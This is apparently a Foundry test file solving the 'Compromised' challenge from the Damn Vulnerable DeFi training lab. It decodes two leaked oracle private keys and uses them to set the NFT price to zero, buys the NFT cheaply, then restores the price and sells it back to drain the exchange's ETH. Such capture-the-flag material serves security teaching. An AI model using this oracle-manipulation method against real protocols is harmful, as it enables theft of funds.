// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {ERC721Holder} from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Base64} from "solady/utils/Base64.sol";

contract TestOwnNFT is ERC721Holder, Ownable {
    address private immutable i_token;
    address private immutable i_exchange;

    constructor(address token, address payable exchange) Ownable(msg.sender) {
        i_token = token;
        i_exchange = exchange;
    }

    function getNFT() private {
        Exchange(payable(i_exchange)).buyOne{value: address(this).balance}();
    }

    function sellNFT() external onlyOwner {
        uint256 tokenId = DamnValuableNFT(i_token).nonce() - 1;
        DamnValuableNFT(i_token).approve(i_exchange, tokenId);
        Exchange(payable(i_exchange)).sellOne(tokenId);
    }

    receive() external payable {
        if (msg.sender == owner()) {
            getNFT();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        //2 out of 3 trusted sources are compromised, so we are manipulating the price of the NFT
        bytes memory key1 =
            hex"4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130";
        bytes memory key2 =
            hex"4d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535";
        
        bytes memory source1Key = keySearch(key1);
        bytes memory source2Key = keySearch(key2);
        
        uint256 sourceKey_1 = vm.parseUint(string(source1Key));
        vm.broadcast(sourceKey_1); //Trusted source 1
        TrustfulOracle(oracle).postPrice("DVNFT", 0);
        
        uint256 sourceKey_2 = vm.parseUint(string(source2Key));
        vm.broadcast(sourceKey_2); //Trusted source 2
        TrustfulOracle(oracle).postPrice("DVNFT", 0);

        //player deploys a contract that will buy the NFT and sell it back to the exchange
        vm.startPrank(player);
        TestOwnNFT ownNFT = new TestOwnNFT(address(nft), payable(exchange));
        //player sends the contract some ETH to buy the NFT
        (bool success,) = address(ownNFT).call{value: PLAYER_INITIAL_ETH_BALANCE}("");
        (success);
        vm.stopPrank();
        //check that the contract has the NFT
        assertEq(nft.balanceOf(address(ownNFT)), 1);

        //Oracle changes the price of the NFT back to the initial price
        vm.broadcast(sourceKey_1); //Trusted source 1
        TrustfulOracle(oracle).postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.broadcast(sourceKey_2); //Trusted source 2
        TrustfulOracle(oracle).postPrice("DVNFT", INITIAL_NFT_PRICE);

        vm.startPrank(player);
        ownNFT.sellNFT();
        //player will transfer the required ETH to the recovery address
        (bool sent,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
        (sent);
        vm.stopPrank();
    }

    function keySearch(bytes memory key) internal view returns (bytes memory base64Decoded) {
        string memory hexBytes = string(key);

        base64Decoded = Base64.decode(hexBytes);//private key

        // Derive address
        address derivedAddr = vm.addr(vm.parseUint(string(base64Decoded)));
        //get the address and return its respective key if derived address matches the any three of the oracle addresses
        for(uint i = 0 ; i < sources.length; ){
            if(derivedAddr == sources[i]){
                return base64Decoded;
            }
            unchecked {
                i++;
            }
        } 
    }


    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
